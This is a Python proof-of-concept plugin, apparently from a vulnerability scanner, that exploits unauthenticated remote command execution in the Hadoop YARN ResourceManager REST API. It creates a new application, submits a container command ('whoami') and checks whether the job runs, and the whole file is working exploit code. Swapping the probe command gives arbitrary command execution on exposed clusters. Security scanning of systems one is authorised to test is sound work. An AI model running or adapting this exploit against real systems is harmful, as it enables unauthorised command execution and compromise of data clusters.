#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import json
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'hadoop_yarn_rce'
        self.keyword = ['hadoop', 'rce']
        self.info = 'hadoop_yarn_rce'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            url1 = self.base_url + "ws/v1/cluster/apps/new-application"
            url2 = self.base_url + "ws/v1/cluster/apps"
            async with ClientSession() as session:
                async with session.post(url=url1) as res:
                    if res != None :
                        text = str(await res.text())
                        try:
                            app_id = json.loads(text).get("application-id", "")
                        except:
                            pass
                        else:
                            payload = {
                                'application-id': app_id,
                                'application-name': 'mytest',
                                'am-container-spec': {
                                    'commands': {
                                        'command': 'whoami',
                                    },
                                },
                                'application-type': 'YARN',
                            }
                            async with session.post(url=url2, json=payload) as res:
                                if res != None and res.status == 202 and 'Location' in res.headers.keys():
                                    url3 = res.headers['Location']
                                    async with session.get(url=url3) as res:
                                        if res != None:
                                            text = str(await res.text())
                                            if 'finalStatus' in text and 'FAILED' not in text:
                                                self.flag = 1
                                                self.res.append({"info": url1, "key": 'hadoop yarn rce'})